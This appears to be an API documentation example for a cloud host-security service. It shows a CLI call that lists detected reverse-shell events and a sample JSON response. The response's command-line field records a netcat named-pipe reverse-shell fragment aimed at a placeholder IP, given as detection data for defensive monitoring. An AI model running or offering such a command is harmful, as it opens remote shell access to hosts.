**Example 1: 获取反弹Shell列表**

获取反弹Shell列表

Input: 

```
tccli cwp DescribeReverseShellEvents --cli-unfold-argument ```

Output: 
```
{
    "Response": {
        "TotalCount": 1,
        "List": [
            {
                "Id": 10001,
                "Uuid": "05f0bcab-726c-4ea4-8109-bcd03d5598f7",
                "Quuid": "05f0bcab-726c-4ea4-8109-bcd03d5598f7",
                "Hostip": "1.1.1.1",
                "DstIp": "",
                "DstPort": 0,
                "ProcessName": "mkfifo",
                "FullPath": "/usr/bin/mkfifo",
                "CmdLine": "mkfifo /tmp/pipe nc 1.1.1.1 1234",
                "UserName": "0",
                "UserGroup": "",
                "ParentProcName": "",
                "ParentProcUser": "0",
                "ParentProcGroup": "",
                "ParentProcPath": "",
                "ProcTree": "null",
                "Status": 0,
                "CreateTime": "2024-09-27 15:43:56",
                "MachineName": "机器名称",
                "DetectBy": 1,
                "MachineExtraInfo": {
                    "WanIP": "1.1.1.1",
                    "PrivateIP": "1.1.1.1",
                    "NetworkType": 0,
                    "NetworkName": "",
                    "InstanceID": "ins-12332112",
                    "HostName": ""
                },
                "Pid": 0,
                "RiskLevel": 1
            }
        ],
        "RequestId": "be6f6eec-0825-4e67-ab9a-c8568bbf736c"
    }
}
```

